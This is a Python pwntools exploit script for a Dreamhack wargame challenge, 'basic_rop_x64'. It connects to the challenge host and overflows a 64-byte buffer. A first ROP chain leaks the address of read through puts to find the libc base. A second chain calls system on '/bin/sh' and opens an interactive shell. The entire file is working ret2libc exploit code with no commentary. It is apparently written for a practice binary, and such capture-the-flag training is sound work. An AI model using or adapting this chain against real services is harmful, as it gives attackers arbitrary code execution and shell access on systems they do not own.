from pwn import *


libc = ELF("./libc.so.6")
e = ELF("./basic_rop_x64")

#p = process("./basic_rop_x86",env={"LD_PRELOAD":"/home/ubuntu/dreamhack/basic_rop_x86/libc.so.6"})
p = remote("host1.dreamhack.games",14454)

read_got = e.got['read']
puts_plt = e.plt['puts']

pop_rdi_ret = 0x00400883
main = 0x00000000004007ba

binsh_offset = 0x18cd57
read_offset = libc.symbols['read']
system_offset = libc.symbols['system']


payload = b"A" * (64 + 8)

payload += p64(pop_rdi_ret)
payload += p64(read_got)
payload += p64(puts_plt)
payload += p64(main)

p.send(payload)

dummy = p.recvn(0x40)
print(dummy)
read_addr = p.recv(6)
print(read_addr)
read_addr = u64(read_addr.ljust(8,b'\x00'))
print(hex(read_addr))
libc_base = read_addr - read_offset
print(hex(libc_base))
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset

payload = b"A" * (64+8)
payload += p64(pop_rdi_ret)
payload += p64(binsh_addr)
payload += p64(system_addr)

p.send(payload)

p.interactive()
